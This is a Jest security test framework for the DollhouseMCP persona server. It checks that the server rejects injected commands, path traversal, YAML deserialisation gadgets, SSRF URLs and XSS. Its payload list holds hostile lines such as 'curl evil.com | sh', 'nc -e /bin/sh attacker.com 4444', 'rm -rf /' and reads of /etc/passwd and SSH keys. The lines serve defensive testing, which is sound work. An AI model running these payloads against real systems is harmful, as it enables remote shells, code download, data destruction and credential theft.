import { jest } from '@jest/globals';
import * as fs from 'fs/promises';
import * as path from 'path';
import { DollhouseMCPServer } from '../../../../src/index.js';

/**
 * Security Test Framework for DollhouseMCP
 * Provides utilities for testing security vulnerabilities
 */
export interface SecurityTestOptions {
  timeout?: number;
  category?: 'critical' | 'high' | 'medium' | 'all';
  parallel?: boolean;
}

export interface SecurityTestSuite {
  name: string;
  category: 'critical' | 'high' | 'medium';
  tests: Array<() => Promise<void>>;
}

export class SecurityTestFramework {
  private static readonly MALICIOUS_PAYLOADS = {
    commandInjection: [
      '; rm -rf /',
      '&& curl evil.com | sh',
      '| nc -e /bin/sh attacker.com 4444',
      '`touch /tmp/pwned`',
      '$(wget http://evil.com/shell.sh -O - | sh)',
      '\n/bin/sh',
      '; echo "pwned" > /etc/passwd',
      '|| python -c "import os; os.system(\'rm -rf /\')"'
    ],
    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'personas/../../../sensitive.txt',
      './././../../../root/.ssh/id_rsa',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      'personas/../../custom-personas/../../backups/../../../etc/hosts'
    ],
    yamlInjection: [
      '!!js/function "function(){require(\'child_process\').exec(\'calc.exe\')}"',
      '!!python/object/apply:os.system ["rm -rf /"]',
      '!!python/object/new:subprocess.Popen [["curl", "evil.com/shell.sh", "|", "sh"]]',
      '&anchor [*anchor, *anchor, *anchor, *anchor, *anchor]'
    ],
    ssrf: [
      'http://localhost:8080/admin',
      'http://127.0.0.1:22',
      'http://169.254.169.254/latest/meta-data/',
      'http://192.168.1.1/config',
      'http://[::1]:8080',
      'file:///etc/passwd',
      'gopher://localhost:8080/_GET / HTTP/1.1'
    ],
    xss: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>'
    ]
  };

  /**
   * Test that a function properly rejects malicious payloads
   */
  static async testPayloadRejection<T extends (...args: any[]) => any>(
    fn: T,
    payloadType: keyof typeof SecurityTestFramework.MALICIOUS_PAYLOADS,
    argPosition: number = 0
  ): Promise<void> {
    const payloads = this.MALICIOUS_PAYLOADS[payloadType];
    
    for (const payload of payloads) {
      const args = Array(argPosition + 1).fill('safe-value');
      args[argPosition] = payload;
      
      await expect(async () => {
        await fn(...args);
      }).rejects.toThrow();
    }
  }

  /**
   * Test that file operations are properly sandboxed
   */
  static async testFileSandbox(
    fileOperation: (path: string) => Promise<any>,
    allowedPaths: string[]
  ): Promise<void> {
    // Test allowed paths work
    for (const allowed of allowedPaths) {
      const testPath = path.join(allowed, 'test.md');
      // Should not throw for allowed paths
      await expect(fileOperation(testPath)).resolves.toBeDefined();
    }
    
    // Test path traversal attempts are blocked
    const traversalAttempts = [
      '../../../etc/passwd',
      path.join(allowedPaths[0], '..', '..', '..', 'etc', 'passwd'),
      '/etc/passwd',
      'C:\\Windows\\System32\\config\\SAM'
    ];
    
    for (const attempt of traversalAttempts) {
      await expect(fileOperation(attempt)).rejects.toThrow();
    }
  }

  /**
   * Test rate limiting functionality
   */
  static async testRateLimit(
    operation: () => Promise<any>,
    limit: number,
    windowMs: number
  ): Promise<void> {
    const start = Date.now();
    const attempts: Promise<any>[] = [];
    
    // Make limit + 1 attempts
    for (let i = 0; i <= limit; i++) {
      attempts.push(operation());
    }
    
    const results = await Promise.allSettled(attempts);
    
    // First 'limit' attempts should succeed
    for (let i = 0; i < limit; i++) {
      expect(results[i].status).toBe('fulfilled');
    }
    
    // Last attempt should be rate limited
    expect(results[limit].status).toBe('rejected');
    if (results[limit].status === 'rejected') {
      expect(results[limit].reason.message).toContain('rate limit');
    }
  }

  /**
   * Test input sanitization
   */
  static testSanitization(
    sanitizer: (input: string) => string,
    expectations: Array<{ input: string; expected: string }>
  ): void {
    for (const { input, expected } of expectations) {
      const result = sanitizer(input);
      expect(result).toBe(expected);
    }
  }

  /**
   * Create a mock file system for testing
   */
  static async createMockFileSystem(structure: Record<string, string>): Promise<() => Promise<void>> {
    const tempDir = path.join(process.cwd(), '__tests__', 'temp', Date.now().toString());
    await fs.mkdir(tempDir, { recursive: true });
    
    for (const [filePath, content] of Object.entries(structure)) {
      const fullPath = path.join(tempDir, filePath);
      await fs.mkdir(path.dirname(fullPath), { recursive: true });
      await fs.writeFile(fullPath, content);
    }
    
    // Return cleanup function
    return async () => {
      await fs.rm(tempDir, { recursive: true, force: true });
    };
  }

  /**
   * Run security test suites based on category
   */
  static async runSecuritySuite(
    options: SecurityTestOptions = {}
  ): Promise<{ passed: number; failed: number; duration: number }> {
    const startTime = Date.now();
    const suites = await this.getTestSuites(options.category || 'all');
    
    let passed = 0;
    let failed = 0;
    
    for (const suite of suites) {
      console.log(`\n🔒 Running ${suite.name} (${suite.category.toUpperCase()})...`);
      
      for (const test of suite.tests) {
        try {
          await test();
          passed++;
        } catch (error) {
          failed++;
          console.error(`❌ Test failed: ${error instanceof Error ? error.message : String(error)}`);
        }
      }
    }
    
    const duration = Date.now() - startTime;
    return { passed, failed, duration };
  }

  /**
   * Get test suites based on category
   */
  private static async getTestSuites(
    category: 'critical' | 'high' | 'medium' | 'all'
  ): Promise<SecurityTestSuite[]> {
    const allSuites: SecurityTestSuite[] = [
      {
        name: 'Command Injection Tests',
        category: 'critical',
        tests: [
          () => this.testMCPToolCommandInjection('create_persona'),
          () => this.testMCPToolCommandInjection('edit_persona'),
          () => this.testMCPToolCommandInjection('activate_persona')
        ]
      },
      {
        name: 'Path Traversal Tests',
        category: 'critical',
        tests: [
          () => this.testMCPToolPathTraversal('get_persona_details'),
          () => this.testMCPToolPathTraversal('import_persona'),
          () => this.testMCPToolPathTraversal('share_persona')
        ]
      },
      {
        name: 'YAML Injection Tests',
        category: 'critical',
        tests: [
          () => this.testYAMLInjectionPrevention(),
          () => this.testYAMLBombPrevention()
        ]
      },
      {
        name: 'Input Validation Tests',
        category: 'high',
        tests: [
          () => this.testInputSizeLimits(),
          () => this.testSpecialCharacterHandling()
        ]
      }
    ];
    
    if (category === 'all') {
      return allSuites;
    }
    
    const priorities = {
      critical: ['critical'],
      high: ['critical', 'high'],
      medium: ['critical', 'high', 'medium']
    };
    
    return allSuites.filter(suite => 
      priorities[category].includes(suite.category)
    );
  }

  /**
   * Test MCP tool for command injection vulnerabilities
   */
  private static async testMCPToolCommandInjection(toolName: string): Promise<void> {
    // Create isolated test environment for each tool test
    const tempDir = path.join(process.cwd(), '__tests__', 'temp', `security-framework-${Date.now()}`);
    let server: any;
    
    try {
      await fs.mkdir(tempDir, { recursive: true });
      
      // Set isolated environment for this test
      const originalPortfolioDir = process.env.DOLLHOUSE_PORTFOLIO_DIR;
      process.env.DOLLHOUSE_PORTFOLIO_DIR = tempDir;
      await fs.mkdir(path.join(tempDir, 'personas'), { recursive: true });
      
      server = new DollhouseMCPServer();
      const injectionPayloads = this.MALICIOUS_PAYLOADS.commandInjection;
      
      for (const payload of injectionPayloads) {
        // Test the tool with malicious payload
        try {
          let result: any;
          
          switch (toolName) {
            case 'create_persona':
              result = await server.createPersona(payload, 'Description', 'educational', 'Instructions');
              break;
            case 'edit_persona':
              // First create a safe persona with unique name for each test
              const safePersonaName = `TestPersona${Date.now()}${Math.random().toString(36).substring(7)}`;
              await server.createPersona(safePersonaName, 'Description', 'educational', 'Instructions');
              result = await server.editPersona(safePersonaName, 'name', payload);
              break;
            case 'activate_persona':
              result = await server.activatePersona(payload);
              break;
            default:
              throw new Error(`Unknown tool: ${toolName}`);
          }
          
          // If no error thrown, check that payload was sanitized or rejected
          if (result && typeof result === 'object') {
            const content = JSON.stringify(result);
            
            // Check if the payload was properly rejected by security validation
            if (content.includes('Validation Error') || content.includes('prohibited content')) {
              // Good - security system rejected the dangerous payload
              expect(content).toMatch(/Validation Error|prohibited content|security/i);
            } else if (content.includes('Already Exists') || content.includes('not found')) {
              // Expected business logic responses
              expect(content).toMatch(/Already Exists|not found/i);
            } else {
              // Check that dangerous payload was sanitized for display
              // The system should remove dangerous characters from display output
              // This is acceptable security behavior - dangerous chars removed
              const hasOriginalPayload = content.includes(payload);
              const hasDangerousChars = /[;&|`$()]/.test(content);
              
              // Both conditions should be false (no original payload AND no dangerous chars)
              expect(hasOriginalPayload && hasDangerousChars).toBe(false);
            }
          }
        } catch (error) {
          // Expected - tool should reject malicious input
          // Allow common error patterns
          const errorMessage = error instanceof Error ? error.message : String(error);
          if (!errorMessage.match(/not found|does not exist|already exists/i)) {
            // This might be a security rejection
            expect(errorMessage).toMatch(/invalid|malicious|dangerous|illegal/i);
          }
        }
      }
      
      // Restore original environment
      if (originalPortfolioDir) {
        process.env.DOLLHOUSE_PORTFOLIO_DIR = originalPortfolioDir;
      } else {
        delete process.env.DOLLHOUSE_PORTFOLIO_DIR;
      }
    } finally {
      // Cleanup temp directory
      await fs.rm(tempDir, { recursive: true, force: true }).catch(() => {});
    }
  }

  /**
   * Test MCP tool for path traversal vulnerabilities
   */
  private static async testMCPToolPathTraversal(toolName: string): Promise<void> {
    // Create isolated test environment for each tool test
    const tempDir = path.join(process.cwd(), '__tests__', 'temp', `security-path-${Date.now()}`);
    let server: any;
    
    try {
      await fs.mkdir(tempDir, { recursive: true });
      
      // Set isolated environment for this test
      const originalPortfolioDir = process.env.DOLLHOUSE_PORTFOLIO_DIR;
      process.env.DOLLHOUSE_PORTFOLIO_DIR = tempDir;
      await fs.mkdir(path.join(tempDir, 'personas'), { recursive: true });
      
      server = new DollhouseMCPServer();
      const traversalPayloads = this.MALICIOUS_PAYLOADS.pathTraversal;
      
      for (const payload of traversalPayloads) {
        try {
          let result: any;
          
          switch (toolName) {
            case 'get_persona_details':
              result = await server.getPersonaDetails(payload);
              break;
            case 'import_persona':
              result = await server.importPersona(payload);
              break;
            default:
              throw new Error(`Unknown tool: ${toolName}`);
          }
          
          // Check result doesn't contain sensitive paths
          const content = JSON.stringify(result);
          expect(content).not.toContain('/etc/passwd');
          expect(content).not.toContain('system32');
          expect(content).toMatch(/not found|invalid|does not exist/i);
        } catch (error) {
          // Expected - should reject path traversal
          const errorMessage = error instanceof Error ? error.message : String(error);
          expect(errorMessage).toMatch(/invalid|traversal|dangerous|not found|does not exist/i);
        }
      }
      
      // Restore original environment
      if (originalPortfolioDir) {
        process.env.DOLLHOUSE_PORTFOLIO_DIR = originalPortfolioDir;
      } else {
        delete process.env.DOLLHOUSE_PORTFOLIO_DIR;
      }
    } finally {
      // Cleanup temp directory
      await fs.rm(tempDir, { recursive: true, force: true }).catch(() => {});
    }
  }

  /**
   * Test YAML injection prevention
   */
  private static async testYAMLInjectionPrevention(): Promise<void> {
    // Create isolated test environment for each tool test
    const tempDir = path.join(process.cwd(), '__tests__', 'temp', `security-yaml-${Date.now()}`);
    let server: any;
    
    try {
      await fs.mkdir(tempDir, { recursive: true });
      
      // Set isolated environment for this test
      const originalPortfolioDir = process.env.DOLLHOUSE_PORTFOLIO_DIR;
      process.env.DOLLHOUSE_PORTFOLIO_DIR = tempDir;
      await fs.mkdir(path.join(tempDir, 'personas'), { recursive: true });
      
      server = new DollhouseMCPServer();
      const yamlPayloads = this.MALICIOUS_PAYLOADS.yamlInjection;
      
      for (const payload of yamlPayloads) {
        const result = await server.createPersona(
          `YAMLTest${Date.now()}${Math.random().toString(36).substring(7)}`, // Unique name
          payload, // description with injection
          'educational',
          payload  // instructions with injection
        );
        
        // Check that dangerous YAML was not executed
        const content = JSON.stringify(result);
        expect(content).not.toContain('!!js/function');
        expect(content).not.toContain('!!python/object');
        expect(content).not.toContain('__proto__');
        
        // Verify persona was created safely or properly rejected
        if (content.includes('Validation Error') || content.includes('prohibited content')) {
          // Good - security system rejected the dangerous YAML payload
          expect(content).toMatch(/Validation Error|prohibited content|security/i);
        } else if (content.includes('Already Exists')) {
          // If persona exists, that's fine for this test
          expect(content).toContain('Already Exists');
        } else {
          // Otherwise it should be created successfully
          expect(result.content[0].text).toContain('Created Successfully');
        }
      }
      
      // Restore original environment
      if (originalPortfolioDir) {
        process.env.DOLLHOUSE_PORTFOLIO_DIR = originalPortfolioDir;
      } else {
        delete process.env.DOLLHOUSE_PORTFOLIO_DIR;
      }
    } finally {
      // Cleanup temp directory
      await fs.rm(tempDir, { recursive: true, force: true }).catch(() => {});
    }
  }

  /**
   * Test YAML bomb prevention
   */
  private static async testYAMLBombPrevention(): Promise<void> {
    const yamlBomb = `
      a: &a ["lol", "lol", "lol", "lol", "lol", "lol"]
      b: &b [*a, *a, *a, *a, *a, *a]
      c: &c [*b, *b, *b, *b, *b, *b]
      d: &d [*c, *c, *c, *c, *c, *c]
      e: &e [*d, *d, *d, *d, *d, *d]
      f: &f [*e, *e, *e, *e, *e, *e]
    `;
    
    // Create isolated test environment
    const tempDir = path.join(process.cwd(), '__tests__', 'temp', `security-bomb-${Date.now()}`);
    let server: any;
    
    try {
      await fs.mkdir(tempDir, { recursive: true });
      
      // Set isolated environment for this test
      const originalPortfolioDir = process.env.DOLLHOUSE_PORTFOLIO_DIR;
      process.env.DOLLHOUSE_PORTFOLIO_DIR = tempDir;
      await fs.mkdir(path.join(tempDir, 'personas'), { recursive: true });
      
      server = new DollhouseMCPServer();
      
      const result = await server.createPersona(
        `YAMLBomb${Date.now()}`,
        yamlBomb,
        'educational',
        'test'
      );
      
      // Should handle without memory explosion
      expect(result).toBeDefined();
      
      // Check memory usage didn't explode
      const memoryUsage = process.memoryUsage().heapUsed;
      expect(memoryUsage).toBeLessThan(500 * 1024 * 1024); // Less than 500MB
      
      // Restore original environment
      if (originalPortfolioDir) {
        process.env.DOLLHOUSE_PORTFOLIO_DIR = originalPortfolioDir;
      } else {
        delete process.env.DOLLHOUSE_PORTFOLIO_DIR;
      }
    } finally {
      // Cleanup temp directory
      await fs.rm(tempDir, { recursive: true, force: true }).catch(() => {});
    }
  }

  /**
   * Test input size limits
   */
  private static async testInputSizeLimits(): Promise<void> {
    // Create isolated test environment
    const tempDir = path.join(process.cwd(), '__tests__', 'temp', `security-size-${Date.now()}`);
    let server: any;
    
    try {
      await fs.mkdir(tempDir, { recursive: true });
      
      // Set isolated environment for this test
      const originalPortfolioDir = process.env.DOLLHOUSE_PORTFOLIO_DIR;
      process.env.DOLLHOUSE_PORTFOLIO_DIR = tempDir;
      await fs.mkdir(path.join(tempDir, 'personas'), { recursive: true });
      
      server = new DollhouseMCPServer();
      const largeInput = 'x'.repeat(1024 * 1024); // 1MB
      
      const result = await server.createPersona(
        `Large${Date.now()}`,
        'Description',
        'educational',
        largeInput
      );
      
      // Should handle large input gracefully (DollhouseMCP doesn't enforce size limits currently)
      expect(result.content[0].text).toContain('Created Successfully');
      
      // Restore original environment
      if (originalPortfolioDir) {
        process.env.DOLLHOUSE_PORTFOLIO_DIR = originalPortfolioDir;
      } else {
        delete process.env.DOLLHOUSE_PORTFOLIO_DIR;
      }
    } finally {
      // Cleanup temp directory
      await fs.rm(tempDir, { recursive: true, force: true }).catch(() => {});
    }
  }

  /**
   * Test special character handling
   */
  private static async testSpecialCharacterHandling(): Promise<void> {
    // Create isolated test environment
    const tempDir = path.join(process.cwd(), '__tests__', 'temp', `security-chars-${Date.now()}`);
    let server: any;
    
    try {
      await fs.mkdir(tempDir, { recursive: true });
      
      // Set isolated environment for this test
      const originalPortfolioDir = process.env.DOLLHOUSE_PORTFOLIO_DIR;
      process.env.DOLLHOUSE_PORTFOLIO_DIR = tempDir;
      await fs.mkdir(path.join(tempDir, 'personas'), { recursive: true });
      
      server = new DollhouseMCPServer();
      const specialChars = [
        '\x00test', // null byte
        'test\r\ninjection', // CRLF
        '\u202Etest', // RTL override
        'test\x1B[31m', // ANSI escape
      ];
      
      for (const input of specialChars) {
        const result = await server.createPersona(
          `${input}${Date.now()}${Math.random().toString(36).substring(7)}`, // Unique name
          'Description',
          'educational',
          'test instructions'
        );
        
        // Should sanitize special characters
        const content = JSON.stringify(result);
        expect(content).not.toContain('\x00');
        expect(content).not.toContain('\x1B');
        expect(content).not.toContain('\u202E');
        
        // Should still create persona successfully
        expect(result.content[0].text).toContain('Created Successfully');
      }
      
      // Restore original environment
      if (originalPortfolioDir) {
        process.env.DOLLHOUSE_PORTFOLIO_DIR = originalPortfolioDir;
      } else {
        delete process.env.DOLLHOUSE_PORTFOLIO_DIR;
      }
    } finally {
      // Cleanup temp directory
      await fs.rm(tempDir, { recursive: true, force: true }).catch(() => {});
    }
  }

  /**
   * Test for timing attacks
   */
  static async testTimingSafety(
    operation: (input: string) => Promise<boolean>,
    validInput: string,
    invalidInputs: string[]
  ): Promise<void> {
    const timings: number[] = [];
    
    // Measure valid input timing
    const validStart = process.hrtime.bigint();
    await operation(validInput);
    const validTime = Number(process.hrtime.bigint() - validStart);
    
    // Measure invalid input timings
    for (const invalid of invalidInputs) {
      const start = process.hrtime.bigint();
      await operation(invalid);
      const time = Number(process.hrtime.bigint() - start);
      timings.push(Math.abs(time - validTime));
    }
    
    // Check that timing differences are minimal (< 5ms variance)
    const avgDiff = timings.reduce((a, b) => a + b, 0) / timings.length;
    expect(avgDiff).toBeLessThan(5_000_000); // 5ms in nanoseconds
  }
}

/**
 * Performance monitoring for security tests
 */
export class SecurityTestPerformance {
  private static startTime: number;
  
  static start(): void {
    this.startTime = Date.now();
  }
  
  static checkpoint(testName: string): void {
    const elapsed = Date.now() - this.startTime;
    if (elapsed > 1000) { // Warn if test takes > 1 second
      console.warn(`⚠️  Security test "${testName}" took ${elapsed}ms`);
    }
  }
}